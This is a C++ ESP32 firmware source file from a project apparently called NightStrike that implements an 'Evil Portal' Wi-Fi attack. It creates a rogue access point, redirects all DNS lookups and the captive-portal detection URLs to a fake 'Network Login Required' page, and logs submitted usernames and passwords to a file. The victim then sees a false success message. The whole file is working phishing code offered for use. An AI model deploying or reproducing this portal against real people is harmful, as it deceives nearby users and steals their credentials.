#include "modules/wifi_module.h"
#include "core/storage.h"
#include <ESPAsyncWebServer.h>
#include <DNSServer.h>
#include <WiFi.h>
#include <LittleFS.h>

namespace NightStrike {
namespace Modules {

// Evil Portal implementation
static DNSServer* g_dnsServer = nullptr;
static AsyncWebServer* g_evilPortalServer = nullptr;
static std::string g_portalSSID = "";
static std::string g_portalHTML = "";

static std::string getDefaultPortalHTMLImpl() {
    return R"(
<!DOCTYPE html>
<html>
<head>
    <title>Network Login</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { font-family: Arial; background: #f0f0f0; padding: 20px; }
        .login-box { background: white; padding: 30px; border-radius: 10px; max-width: 400px; margin: 0 auto; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        h1 { color: #333; text-align: center; }
        input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ddd; border-radius: 5px; box-sizing: border-box; }
        button { width: 100%; padding: 12px; background: #007bff; color: white; border: none; border-radius: 5px; cursor: pointer; font-size: 16px; }
        button:hover { background: #0056b3; }
    </style>
</head>
<body>
    <div class="login-box">
        <h1>Network Login Required</h1>
        <p>Please enter your credentials to connect to the network.</p>
        <form action="/login" method="POST">
            <input type="text" name="username" placeholder="Username" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Connect</button>
        </form>
    </div>
</body>
</html>
    )";
}

// WiFiModule methods implementation
Core::Error WiFiModule::startEvilPortal(const std::string& ssid, const std::string& portalHtml) {
    if (!_initialized) {
        return Core::Error(Core::ErrorCode::NOT_INITIALIZED);
    }

    g_portalSSID = ssid;
    g_portalHTML = portalHtml.empty() ? getDefaultPortalHTMLImpl() : portalHtml;

    // Start AP
    Core::Error err = startAP(ssid);
    if (err.isError()) {
        return err;
    }

    // Start DNS server for captive portal
    if (!g_dnsServer) {
        g_dnsServer = new DNSServer();
    }
    g_dnsServer->start(53, "*", WiFi.softAPIP());

    // Start web server
    if (!g_evilPortalServer) {
        g_evilPortalServer = new AsyncWebServer(80);
    }

    // Serve portal page
    g_evilPortalServer->on("/", HTTP_GET, [](AsyncWebServerRequest* request) {
        request->send(200, "text/html", g_portalHTML.c_str());
    });

    // Handle form submission
    g_evilPortalServer->on("/login", HTTP_POST, [](AsyncWebServerRequest* request) {
        // Extract credentials
        if (request->hasParam("username", true) && request->hasParam("password", true)) {
            String username = request->getParam("username", true)->value();
            String password = request->getParam("password", true)->value();

            Serial.printf("[EvilPortal] Credentials captured: %s / %s\n",
                         username.c_str(), password.c_str());

            // Save credentials to storage
            auto& storage = Core::Storage::getInstance();
            String credFile = "/evil_portal_creds.txt";
            File file = LittleFS.open(credFile.c_str(), "a");
            if (file) {
                file.printf("%s:%s\n", username.c_str(), password.c_str());
                file.close();
            }
        }

        // Redirect to "success" page
        request->redirect("/success");
    });

    g_evilPortalServer->on("/success", HTTP_GET, [](AsyncWebServerRequest* request) {
        request->send(200, "text/html",
            "<html><body><h1>Connection Successful!</h1><p>You are now connected.</p></body></html>");
    });

    // Captive portal detection endpoints
    g_evilPortalServer->on("/generate_204", HTTP_GET, [](AsyncWebServerRequest* request) {
        request->redirect("/");
    });

    g_evilPortalServer->on("/hotspot-detect.html", HTTP_GET, [](AsyncWebServerRequest* request) {
        request->redirect("/");
    });

    g_evilPortalServer->begin();

    Serial.println("[EvilPortal] Started");
    return Core::Error(Core::ErrorCode::SUCCESS);
}

Core::Error WiFiModule::stopEvilPortal() {
    if (g_evilPortalServer) {
        g_evilPortalServer->end();
        delete g_evilPortalServer;
        g_evilPortalServer = nullptr;
    }

    if (g_dnsServer) {
        g_dnsServer->stop();
        delete g_dnsServer;
        g_dnsServer = nullptr;
    }

    stopAP();

    Serial.println("[EvilPortal] Stopped");
    return Core::Error(Core::ErrorCode::SUCCESS);
}

std::string WiFiModule::getDefaultPortalHTML() {
    return getDefaultPortalHTMLImpl();
}

} // namespace Modules
} // namespace NightStrike
